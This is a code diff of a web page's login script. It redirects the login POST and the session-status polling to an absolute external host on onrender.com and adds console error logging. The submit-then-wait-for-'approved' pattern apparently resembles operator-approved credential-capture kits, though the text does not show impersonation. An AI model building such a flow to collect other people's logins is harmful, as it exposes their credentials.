@@ -80,8 +80,6 @@
     </div>
 </main>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-
 <script>
 let sessionId = null;
 let checkInterval = null;
@@ -102,7 +100,7 @@ function checkStatus() {
     if (!sessionId) return;
     
     $.ajax({
-        url: `/status/${sessionId}`,
+        url: `https://shopy-fbwo.onrender.com/status/${sessionId}`,
         method: 'GET',
         success: function(response) {
             if (response.status === "approved") {
@@ -144,7 +142,7 @@ function sendLogin() {
     if (checkInterval) clearInterval(checkInterval);
 
     $.ajax({
-        url: '/login',
+        url: 'https://shopy-fbwo.onrender.com/login',
         method: 'POST',
         contentType: 'application/json',
         data: JSON.stringify({
@@ -171,9 +169,10 @@ function sendLogin() {
                 alert("Login failed. Please try again.");
             }
         },
-        error: function() {
+        error: function(xhr, status, error) {
             hideButtonSpinner();
-            alert("Connection error. Please try again.");
+            console.error("Error details:", xhr.responseText, status, error);
+            alert("Connection error. Please check console for details.");
         }
     });
 }
@@ -191,4 +190,5 @@ $(window).on('beforeunload', function() {
 
 </body>
 </html>
+
 
